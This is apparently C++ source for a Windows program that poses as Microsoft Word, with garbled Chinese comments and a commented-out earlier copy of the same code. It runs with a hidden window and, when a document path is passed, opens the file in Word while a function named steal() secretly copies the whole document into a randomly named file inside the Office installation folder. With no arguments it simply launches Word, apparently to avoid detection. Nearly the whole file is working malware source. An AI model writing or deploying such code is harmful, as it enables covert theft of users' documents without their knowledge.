#define _CRT_SECURE_NO_WARNINGS//��ֹ��sprintf��fopen������
#include <iostream>
#include <windows.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")//�������д���
#include <string>
#include <time.h>
#include <sys/stat.h>//�����ļ���С
using namespace std;
int steal(wstring path,unsigned short pathlength);//����͵�Ժ���
int gbk_strlen(const char* str);
int main(int argc,char* argv[])//�����������������ļ�·����Ϣ
{
	if(argc==1)//���ⱻ���֣�������word����
	{
		ShellExecute(NULL, L"open",L"\"C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE\"",NULL, NULL, SW_SHOWNORMAL);
		return 0;
	}
	setlocale(LC_ALL,"chs");//���õ���Ϊ�й������ģ�
	
	short pathlength=gbk_strlen(argv[1]);//���·�����ȣ����ں���ת��wstring����

	wstring path;//·����ű���
	wstring path2=L"\"";
	wchar_t *temp=new wchar_t[pathlength+1];//��ʱָ����������ں���ת��wstring����
	mbstowcs(temp,argv[1],pathlength+1);
	path+=temp;//ת��Ϊwstring
	path2+=temp;
	delete[] temp;//�ͷ���ʱ����
	path2+=L"\"";
	ShellExecute(NULL, L"open",L"\"C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE\"",path2.c_str(), NULL, SW_SHOWNORMAL);//ִ�д�����word����
	steal(path,pathlength);//ʵʩ����
	return 0;
}

int steal(wstring path,unsigned short pathlength)
{
	//setlocale(LC_ALL,"chs");
	time_t temp;//����ʱ�����
	temp=time(NULL);
	char* t;
	t=asctime(localtime(&temp));//ʱ��ת���ı��ɶ�������t��
	FILE *fp,*fp2;

	
	//int length=wcslen(path.c_str());
	//wstringת*wchar_t
	wchar_t *cp_path=new wchar_t[pathlength+1];
	unsigned int i=0;
	for(;i<pathlength;i++)
	{
		cp_path[i]=path[i];
	}
	cp_path[i]='\0';

	//���Դ����ļ�
	fp=_wfopen(cp_path,L"rb");
	if(fp==NULL)//��ʧ�ܣ�д����־
	{
		fp2=fopen("C:/Program Files/Microsoft Office/root/encryption/log.dat","a");
		fputs(t,fp2);
		fputs("\n",fp2);
		fputws(cp_path,fp2);
		fputs("\n",fp2);
		fclose(fp);
		fclose(fp2);
		return 0;
	}

	//�������������Ϊ�����ļ���
	srand(time(NULL));
	char buf[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char ecyname[9];
	sprintf(ecyname,"%c%c%c%c%c%c%c%c",buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62]);
	char ecypath[60];
	sprintf(ecypath,"%s/%s","C:/Program Files/Microsoft Office/root/encryption",ecyname);


	fp2=fopen(ecypath,"wb+");//�򿪼����ļ�

	size_t getFileSizel((const char)cp_path);//��ȡ�ļ���С
	struct _stat64 statbuf;
	_wstat64(cp_path,&statbuf);
	unsigned int filesize = statbuf.st_size;
	//i=0;
	//while(i<8)
	//{
	//	fputc('0',fp2);
	//	i++;
	//}
	unsigned char written[]={0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01};
	fwrite(written,1,8,fp2);

	//д��·����Ϣ
	i=0;
	while(i<pathlength)
	{
		fputwc(path[i],fp2);
		i++;
	}

	//д��ʱ����Ϣ
	/*i=0;
	while(i<strlen(t))
	{
		fputc(t[i],fp2);
		i++;
	}*/

	////д��ָ���0x0000
	//i=0;
	//while(i<4)
	//{
	//	fputc('0',fp2);
	//	i++;
	//}
	fseek(fp2,0,SEEK_SET);
	fwrite(&pathlength,2,1,fp2);
	fseek(fp2,0,SEEK_END);
	int dellength=ftell(fp2);
	fseek(fp2,2,SEEK_SET);
	fwrite(&dellength,2,1,fp2);
	fwrite(&filesize,4,1,fp2);
	fseek(fp2,0,SEEK_END);

	//д�루��ȡ���ļ�

	i=0;
	while(i<filesize)
	{
		fputc(fgetc(fp),fp2);
		i++;
	}

	fclose(fp);
	fclose(fp2);
	delete [] cp_path;//�ͷ�·������cp_path[]
	cp_path=NULL;
	return 0;
}

int gbk_strlen(const char* str)
{
	const char* p = str;		//p���ں������
	
	while(*p)					//���ǽ�����0�������ѭ��
	{
		if(*p < 0 && (*(p+1)<0 || *(p+1) < 63))			//���ĺ������
		{
			str++;				//str�ƶ�һλ��p�ƶ��ƶ�2λ����˳��ȼ�1
			p += 2;
		}
		else
		{
			p++;				//str������p�ƶ�һλ�����ȼ�1
		}
	}
	return p-str;				//���ص�ַ֮��
}

//#define _CRT_SECURE_NO_WARNINGS//��ֹ��sprintf��fopen������
//#include <iostream>
//#include <windows.h>
//#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")//�������д���
//#include <string>
//#include <time.h>
//#include <sys/stat.h>//�����ļ���С
//using namespace std;
//int steal(wstring path,unsigned short pathlength);//����͵�Ժ���
//int main(int argc,char* argv[])//�����������������ļ�·����Ϣ
//{
//	if(argc==1)//���ⱻ���֣�������word����
//	{
//		ShellExecute(NULL, L"open",L"\"C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE\"",NULL, NULL, SW_SHOWNORMAL);
//		return 0;
//	}
//	setlocale(LC_ALL,"chs");//���õ���Ϊ�й������ģ�
//	
//	unsigned short pathlength=strlen(argv[1]);//���·�����ȣ����ں���ת��wstring����
//	wstring path=L"\"";//·����ű���
//	wchar_t *temp=new wchar_t[pathlength];//��ʱָ����������ں���ת��wstring����
//	mbstowcs(temp,argv[1],pathlength);
//	path+=temp;//ת��Ϊwstring
//	path+=L"\"";
//	delete[] temp;//�ͷ���ʱ����
//	ShellExecute(NULL, L"open",L"\"C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE\"",path.c_str(), NULL, SW_SHOWNORMAL);//ִ�д�����word����
//	steal(path,pathlength);//ʵʩ����
//	return 0;
//}
//
//int steal(wstring path,unsigned short pathlength)
//{
//	//setlocale(LC_ALL,"chs");
//	time_t temp;//����ʱ�����
//	temp=time(NULL);
//	char* t;
//	t=asctime(localtime(&temp));//ʱ��ת���ı��ɶ�������t��
//	FILE *fp,*fp2;
//
//	
//	//int length=wcslen(path.c_str());
//	//wstringת*wchar_t
//	wchar_t *cp_path=new wchar_t[pathlength];
//	long long i=0;
//	for(;i<pathlength;i++)
//	{
//		cp_path[i]=path[i];
//	}
//	cp_path[i]='\0';
//
//	//���Դ����ļ�
//	fp=_wfopen(cp_path,L"rb");
//	if(fp==NULL)//��ʧ�ܣ�д����־
//	{
//		fp2=fopen("C:/Program Files/Microsoft Office/root/encryption/data.log","a+");
//		//fputws(path.c_str(),fp2);
//		fputs(t,fp2);
//		fputs("\n",fp2);
//		fputws(cp_path,fp2);
//		fputs("\n",fp2);
//		fclose(fp);
//		fclose(fp2);
//		return 0;
//	}
//
//	//�������������Ϊ�����ļ���
//	srand(time(NULL));
//	char buf[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
//	char ecyname[9];
//	sprintf(ecyname,"%c%c%c%c%c%c%c%c",buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62]);
//	char ecypath[60];
//	sprintf(ecypath,"%s/%s","C:/Program Files/Microsoft Office/root/encryption",ecyname);
//
//
//	fp2=fopen(ecypath,"wb+");//�򿪼����ļ�
//
//	size_t getFileSizel((const char)cp_path);//��ȡ�ļ���С
//	struct _stat64 statbuf;
//	_wstat64(cp_path,&statbuf);
//	unsigned long long filesize = statbuf.st_size;
//
//	//д��·����Ϣ
//	i=0;
//	while(i<pathlength)
//	{
//		fputwc(path[i],fp2);
//		i++;
//	}
//
//	//д��ָ���0x0000
//	i=0;
//	while(i<4)
//	{
//		fputc('0',fp2);
//		i++;
//	}
//
//	//д��ʱ����Ϣ
//	i=0;
//	while(i<strlen(t))
//	{
//		fputc(t[i],fp2);
//		i++;
//	}
//
//	//д��ָ���0x0000
//	i=0;
//	while(i<4)
//	{
//		fputc('0',fp2);
//		i++;
//	}
//
//	//д�루��ȡ���ļ�
//	i=0;
//	while(i<filesize)
//	{
//		fputc(fgetc(fp),fp2);
//		i++;
//	}
//	fclose(fp);
//	fclose(fp2);
//	delete [] cp_path;//�ͷ�·������cp_path[]
//	cp_path=NULL;
//	return 0;
//}